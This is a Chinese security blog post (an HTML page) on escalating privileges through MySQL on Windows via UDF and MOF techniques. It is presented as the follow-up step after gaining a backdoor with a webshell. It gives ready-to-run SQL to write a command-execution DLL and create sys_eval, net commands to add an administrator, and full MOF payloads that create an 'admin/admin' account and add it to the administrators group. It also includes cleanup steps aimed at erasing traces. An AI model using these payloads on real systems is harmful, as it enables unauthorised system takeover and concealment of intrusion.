@@ -1,0 +1,335 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>mysql提权 | h0ld1rs的随手记</title><meta name="author" content="h0ld1rs"><meta name="copyright" content="h0ld1rs"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="mysql的udf和mof提权的实验">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mysql提权">
+<meta property="og:url" content="https://h0ld1rs.github.io/2021/03/12/%E5%86%85%E7%BD%91%E7%9B%B8%E5%85%B3/mysql%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="h0ld1rs的随手记">
+<meta property="og:description" content="mysql的udf和mof提权的实验">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://h0ld1rs.github.io/img/%E5%9B%BE%E5%BA%93/14.jpg">
+<meta property="article:published_time" content="2021-03-12T11:06:50.000Z">
+<meta property="article:modified_time" content="2021-07-31T07:29:56.601Z">
+<meta property="article:author" content="h0ld1rs">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://h0ld1rs.github.io/img/%E5%9B%BE%E5%BA%93/14.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://h0ld1rs.github.io/2021/03/12/%E5%86%85%E7%BD%91%E7%9B%B8%E5%85%B3/mysql%E6%8F%90%E6%9D%83/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="preconnect" href="//zz.bdstatic.com"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: true
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-07-31 15:29:56'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">96</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">23</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/%E5%9B%BE%E5%BA%93/14.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">h0ld1rs的随手记</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">mysql提权</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-03-12T11:06:50.000Z" title="发表于 2021-03-12 19:06:50">2021-03-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-07-31T07:29:56.601Z" title="更新于 2021-07-31 15:29:56">2021-07-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>7分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="mysql提权的方式"><a href="#mysql提权的方式" class="headerlink" title="mysql提权的方式"></a>mysql提权的方式</h1><p>获得shell以后当然最主要的还是要提权。当用哥斯拉等工具获得后门以后，便开始提权吧！</p>
+<blockquote>
+<p>下载mysql安装路径下的数据文件</p>
+<ul>
+<li>安装路径下的data目录中存放的是数据库的数据信息</li>
+<li>root账号密码存储在mysql数据库下的user表中</li>
+<li>完整路径=安装路径+<code>\data\mysql\user.MYD</code></li>
+</ul>
+<p>mysql的加密方式</p>
+<p>MYSQL 4.1版本之前是MYSQL323加密，MYSQL 4.1和之后的版本都是MYSQLSHA1加密。</p>
+</blockquote>
+<p>推荐几个破解密码的工具</p>
+<ol>
+<li><a href="cmd5.com">cmd5.com</a></li>
+<li><a href="Somd5.com">Somd5.com</a></li>
+<li> <strong>hashcat破解</strong>hashcat支持很多种破解算法</li>
+<li><strong>John the Ripper密码破解</strong></li>
+</ol>
+<h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>UDF提权是利用mysql的自定义函数功能，将mysql账号转换为system权限</p>
+<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p><strong>1. mysql 版本 大于 5.1版本的，udf.dll文件必须放置在mysql安装目录下的lib\plugin文件夹下</strong></p>
+<p><strong>2. mysql版本小于5.1版本的，udf.dll文件在Windows2003下放置于，c://windows//system32，在Windows2000下，放置在c://winnt//system32下</strong></p>
+<p><strong>3. 掌握的mysql数据库账号有对mysql的insert和delete权限，以用来创建和抛弃函数,一般以root账号为佳。具备root账号的其他权限同样也可以</strong></p>
+<p><strong>4. 可以将udf.dll写入到相应目录的权限</strong></p>
+<blockquote>
+<p>关于mysql的几点查询</p>
+<ol>
+<li><p>查询mysql所在的目录</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">&#x27;%basedir%&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ol>
+<ol start="2">
+<li><p>查询mysql的<strong>plugin</strong>目录</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">&quot;%plugin%&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这个目录也就是dll文件需要导入的目录</p>
+</li>
+</ol>
+<ol start="3">
+<li><p>查询系统的架构</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">&#x27;%compile%&#x27;</span>;  </span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</blockquote>
+<h3 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h3><p>假设我的UDF文件名为 udf.dll，存放在MySQL安装目录的 lib/plugin 目录下。在 udf.dll 文件中，定义了名为 sys_eval 的mysql函数，该函数可以执行系统任意命令。但是如果现在就打开MySQL命令行，使用 select sys_eval(‘dir’)；的话，系统会返回sys_eval() 函数未定义。因为仅仅是把 udf.dll 放到了 lib/plugin 目录下，并没有引入。类似于面向对象编程时引入包一样，如果没有引入包，那么这个包里的类你是用不了的。</p>
+<h3 id="提权版本的区别"><a href="#提权版本的区别" class="headerlink" title="提权版本的区别"></a>提权版本的区别</h3><p>1、5.1版本以下调用的是(c:\windows\system32)中的dll文件执行<br>2、5.1版本以上调用mysql安装目录中的lib\plugin中的dll文件执行</p>
+<h3 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h3><ol>
+<li><strong>查看secure_file_priv的值</strong></li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">&#x27;secure%&#x27;</span>;</span><br><span class="line">     <span class="comment">#当 secure_file_priv 的值为 null ，表示限制 mysqld 不允许导入|导出，此时无法提权</span></span><br><span class="line">     <span class="comment">#当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/ 目录下，此时也无法提权</span></span><br><span class="line">     <span class="comment">#当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>secure_file_priv 的值在MySQL数据库的安装目录的 my.ini 文件中配置。</strong></p>
+<blockquote>
+<p>我的mysql是从phpstudy中启动的，一开始<strong>secure_file_priv</strong>是null，后来在phpstudy/extensions/mysql5.7.26/my.ini加入以后才能实现</p>
+</blockquote>
+<p>只有secure_file_priv的值是空的，才能继续提取步骤</p>
+<p>如果值为<em>NULL</em>则不具备写入导出文件的能力。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20210731152839.png"></p>
+<p><strong>如果 secure_file_priv没有具体的值，则可以写入导出文件。</strong></p>
+<p>写出的文件，我的保存在<strong>C:\phpstudy\phpstudy_pro\Extensions\MySQL5.7.26\data</strong>这个目录下</p>
+<ol start="2">
+<li><p><strong>查看plugin的值</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> Host,<span class="keyword">user</span>,<span class="keyword">plugin</span> <span class="keyword">from</span> mysql.user <span class="keyword">where</span> <span class="keyword">user</span> = substring_index(<span class="keyword">user</span>(),<span class="string">&#x27;@&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">	<span class="comment"># 当pligin的值为空时，不可提权</span></span><br><span class="line">	<span class="comment"># 当plugin的值为 mysql_native_password时，可通过账户连接提权</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20210731152857.png"></p>
+</li>
+<li><p><strong>查看系统架构以及plugin目录</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">&#x27;%compile%&#x27;</span>;             <span class="comment">#查看# 查看主机版本及架构</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">&#x27;plugin%&#x27;</span>;               <span class="comment">#查看 # 查看plugin 目录</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20210731152911.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20210731152930.png"></p>
+<p>可以从信息中看到靶机是 x86-64位的系统，plugin地址也有了，我们可以通过kali的msf下载64位的.dll文件。</p>
+<blockquote>
+<p>UDF的dll在sqlmap里也有，我们直接使用sqlmap里的就能找到sqlmap\data\udf\mysql\windows\64。</p>
+<p>但是sqlmap里的udf.dll是经过编码的，需要先解码，解码的工具就在sqlmap/extra/cloak/cloak.py</p>
+<p>解码命令参数：<br>python clock.py -d -i *.\windows\64\lib_mysqludf_sys_</p>
+</blockquote>
+</li>
+<li><p><strong>将dll文件写入plugib目录，并创建函数</strong></p>
+<p>创建一个表并将二进制数据插入到十六进制编码流中。你可以通过insert语句或将其分解为多个部分，然后通过update语句拼接二进制数据。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> temp(<span class="keyword">data</span> longblob);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> temp(<span class="keyword">data</span>) <span class="keyword">values</span> (<span class="number">0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000000000000000000</span>);</span><br><span class="line"><span class="keyword">update</span> temp <span class="keyword">set</span> <span class="keyword">data</span> = <span class="keyword">concat</span>(<span class="keyword">data</span>,<span class="number">0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a383b369f112b376a383b35269636877a383b300000000000000000000000000000000504500006486060070b1834b00000000</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">data</span> <span class="keyword">from</span> temp <span class="keyword">into</span> dump <span class="keyword">file</span> <span class="string">&quot;C:\\phpstudy_pro\\Extensions\\MySQL8.0.12\\lib\\plugin\\udf.dll&quot;</span>;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_eval <span class="keyword">returns</span> <span class="keyword">string</span> <span class="keyword">soname</span> <span class="string">&#x27;udf.dll&#x27;</span>;   <span class="comment">#创建函数sys_eval</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>此种情况用于无法上传文件的时候，必须用数据流进行操作，如果我们具备有文件上传的能力，我们直接可以将dll文件上传上去，这样的话，情况就是这样的</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">&#x27;C:/XXX/lib_mysqludf_sys.dll&#x27;</span>) <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">&#x27;C:/MySQL/MySQL Server 5.1/lib/plugin/lib_mysqludf_sys.dll&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_eval <span class="keyword">returns</span> <span class="keyword">string</span> <span class="keyword">soname</span> <span class="string">&#x27;lib_mysqludf_sys.dll&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>当然有些情况下，可能会限制mysql用户的查询，这时候我们就需要进行绕过。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">hex</span>(<span class="keyword">load_file</span>(<span class="number">16</span>进制编码后的dll路径) <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">&quot;路径&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在将 udf.dll 文件写入plugin目录后，就可以使用 sys_eval 函数了。</p>
+<blockquote>
+<p>#查看创建的sys_eval函数</p>
+<p>select * from mysql.func where name = ‘sys_eval’;  </p>
+<p>#使用系统命令</p>
+<p>select sys_eval(‘whoami’);    </p>
+<p>#删除函数</p>
+<p> drop function “cmdshell”;  </p>
+<p> #删除函数                          </p>
+<p> delete from mysql.func where name=’cmdshell’       </p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20210731152945.png"></p>
+<p>发现命令可以成功执行，至此，提权成功.</p>
+<blockquote>
+<p>这里再说一下，windows的一些命令</p>
+<p>net user 可以查看用户</p>
+<p>net user 账户 密码 /add 可以把用户添加进去</p>
+<p>net localgroup administrators 账号 /add 可以把新建的用户添加到管理员用户组。 </p>
+</blockquote>
+<p>测试完毕以后当然要擦屁股了</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="keyword">DROP</span> <span class="keyword">TABLE</span> udftmp; //为了删除痕迹，把刚刚新建的udftmp表删掉</span><br><span class="line">2. <span class="keyword">drop</span> <span class="keyword">function</span> sys_eval;</span><br><span class="line">3. <span class="keyword">delete</span> <span class="keyword">from</span> mysql.func <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">&#x27;sys_eval&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><blockquote>
+<p>利用c:/windows/system32/wbem/mof/ 目录下的 nullevt.mof 文件，每分钟都会有一个特定的时间去执行一次，那么把cmd命令添加到nullevt.mof中，cmd命令就会自动执行了</p>
+</blockquote>
+<p>注意：与UDF提权一样，查看 secure-file-priv 选项，如有需要，需将my.ini里添加一行”secure-file-priv=”.</p>
+<h3 id="提权要求"><a href="#提权要求" class="headerlink" title="提权要求"></a>提权要求</h3><p>1、低于win2008版本.<br>2、数据库为 mysql&lt;5.7且知道登录账号密码并且允许外连.</p>
+<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>1、先用select version();查看版本，低于5.7可尝试提权</p>
+<p>2、将如下代码保存文件nullevt.mof，添加用户admin/admin(可改用户，代码下admin admin)。上传到可读可写文件夹。</p>
+<p>#pragma namespace(“\.\root\subscription”)</p>
+<p>instance of __EventFilter as $EventFilter<br>{<br>EventNamespace = “Root\Cimv2”;<br>Name = “filtP2”;<br>Query = “Select * From __InstanceModificationEvent “<br>“Where TargetInstance Isa “Win32_LocalTime” “<br>“And TargetInstance.Second = 5”;<br>QueryLanguage = “WQL”;<br>};</p>
+<p>instance of ActiveScriptEventConsumer as $Consumer<br>{<br>Name = “consPCSV2”;<br>ScriptingEngine = “JScript”;<br>ScriptText =<br>“var WSH = new ActiveXObject(“WScript.Shell”)\nWSH.run(“net.exe user admin admin /add”)”;<br>};</p>
+<p>instance of __FilterToConsumerBinding<br>{<br>Consumer = $Consumer;<br>Filter = $EventFilter;<br>};</p>
+<p>3、将如下代码保存文件admin.mof，将admin(刚才添加的用户)添加为管理组。<br>#pragma namespace(“\.\root\subscription”)</p>
+<p>instance of __EventFilter as $EventFilter<br>{<br>EventNamespace = “Root\Cimv2”;<br>Name = “filtP2”;<br>Query = “Select * From __InstanceModificationEvent “<br>“Where TargetInstance Isa “Win32_LocalTime” “<br>“And TargetInstance.Second = 5”;<br>QueryLanguage = “WQL”;<br>};</p>
+<p>instance of ActiveScriptEventConsumer as $Consumer<br>{<br>Name = “consPCSV2”;<br>ScriptingEngine = “JScript”;<br>ScriptText =<br>“var WSH = new ActiveXObject(“WScript.Shell”)\nWSH.run(“net.exe localgroup administrators admin /add”)”;<br>};</p>
+<p>instance of __FilterToConsumerBinding<br>{<br>Consumer = $Consumer;<br>Filter = $EventFilter;<br>};</p>
+<p>4、执行load_file及into dumpfile把文件导出到目录c:/windows/system32/wbem/mof/下<br>select load_file(‘C:\RECYCLER\nullevt.mof’) into dumpfile ‘c:/windows/system32/wbem/mof/nullevt.mof’;<br>select load_file(‘C:\RECYCLER\admin.mof’) into dumpfile ‘c:/windows/system32/wbem/mof/admin.mof’;</p>
+<p>5、使用net user查看添加是否成功</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">h0ld1rs</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://h0ld1rs.github.io/2021/03/12/%E5%86%85%E7%BD%91%E7%9B%B8%E5%85%B3/mysql%E6%8F%90%E6%9D%83/">https://h0ld1rs.github.io/2021/03/12/%E5%86%85%E7%BD%91%E7%9B%B8%E5%85%B3/mysql%E6%8F%90%E6%9D%83/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://h0ld1rs.github.io" target="_blank">h0ld1rs的随手记</a>！</span></div></div><div class="tag_share"><div class="post_share"><div class="social-share" data-image="/img/%E5%9B%BE%E5%BA%93/14.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/03/13/%E5%86%85%E7%BD%91%E7%9B%B8%E5%85%B3/linux-suid%E6%8F%90%E6%9D%83/"><img class="prev-cover" src="/img/%E5%9B%BE%E5%BA%93/23.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">linux_suid提权</div></div></a></div><div class="next-post pull-right"><a href="/2021/03/06/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/"><img class="next-cover" src="/img/%E5%9B%BE%E5%BA%93/17.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">安全设备</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">h0ld1rs</div><div class="author-info__description">博主笨的离谱，希望各位佬们多包含</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">96</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">23</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/h0ld1rs"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/h0ld1rs/" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:yumeibumei@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#mysql%E6%8F%90%E6%9D%83%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-number">1.</span> <span class="toc-text">mysql提权的方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#UDF%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.</span> <span class="toc-text">UDF提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.1.2.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8"><span class="toc-number">1.1.3.</span> <span class="toc-text">如何使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E7%89%88%E6%9C%AC%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">1.1.4.</span> <span class="toc-text">提权版本的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.1.5.</span> <span 